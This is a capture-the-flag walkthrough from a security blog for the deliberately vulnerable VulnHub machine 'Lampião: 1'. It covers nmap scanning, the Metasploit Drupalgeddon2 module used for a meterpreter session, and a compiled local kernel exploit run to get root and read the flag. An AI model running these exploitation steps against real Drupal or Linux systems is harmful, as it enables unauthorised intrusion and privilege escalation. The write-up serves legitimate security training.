<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Lampião: 1 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-lampiao-1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-08-05T20:14:21+00:00">August 5, 2018</time><time class="updated" datetime="2025-06-10T20:29:40+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Lampião: 1”. This VM is developed by Tiago Tavares, which is a standard Boot-to-Root challenge. Our goal is to get into the root directory and see the congratulatory message.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Easy</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> To Find The Final Flag.</span></p>
<p><span style="color: #000000;"><strong>Let’s Breach!!</strong></span></p>
<p><span style="color: #000000;">The target holds 192.168.1.105 as network IP; now using nmap lets find out open ports.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VuyqbdhpniM/W2dZk4zgZPI/AAAAAAAAZRI/81W7gu1ikxkHrICDO5S1oYaJ4jtXDX5OgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Nmap scan shows us port 22, 80, 1898 are open, so we thought of opening the IP address along with the port 1898 in our browser. It also gave us a clue about the webpage that it has Drupal running on it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-L2K0IcwNXeE/W2dZlB2KUHI/AAAAAAAAZRQ/RO3tZJrDzUUwM4wIE3ChOhcVcQhhc4FBwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">From the previous clue, we thought of exploiting it by using exploit <strong>drupal_drupalgeddon2</strong>.</span></p>
<pre class="lang:default decode:true ">msf &gt; user explot/unix/webapp/drupal_drupalgeddon2
msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.1.105
msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 1898
msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</pre>
<p><span style="color: #000000;">Booyah!! We have got the meterpreter, therefore we thought of checking the description about Victim’s Machine by using the command:</span></p>
<pre class="lang:default decode:true">lsb_release -a</pre>
<p><span style="color: #000000;">The description gave us a very strong hint from the <strong>Version</strong> <strong>Number</strong> of the <strong>Victim’s</strong> <strong>Machine</strong> for our Next Step.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZmtaHl01pno/W2dZlGSdPOI/AAAAAAAAZRM/VFhPT025QY0lmbu07-vttCQOXhPfYI6UQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">After a long search using the earlier clue about the Version Number, We have finally found the exploit that we were looking for and we have downloaded it on our machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-7TWlQMf55M0/W2dZl4zwQZI/AAAAAAAAZRY/b0MyryXpOt4j6qJzcnPFUUmK-tu3MKmOgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Side by Side we have executed a python server which will help us to download the exploit over Victim’s Machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-AQl-NQtJIK0/W2dZlnhPVlI/AAAAAAAAZRU/uxEp4P1qTFk-4ml95i7qFfjFPE2Hzmw2wCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We have download this file on server’s /tmp (universal writeable) directory. Since the exploit is in .cpp format, therefore, to compile and execute it, there were specific commands given in the code of the exploit. This gave us a hint on how to compile and execute the exploit <strong>40847.ccp.</strong></span></p>
<p><span style="color: #000000;">Boom, we got the root shell! Let’s read the flag now.</span></p>
<pre class="lang:default decode:true">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow
./dcow -s</pre>
<pre class="lang:default decode:true">cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-PYSUxhqe9k4/W2dZmY-ZItI/AAAAAAAAZRc/C75D1Vft4NcekDFVvZ42gaN9RKlPhemPACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. See’s things from a different angle and an out of the box thinker. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
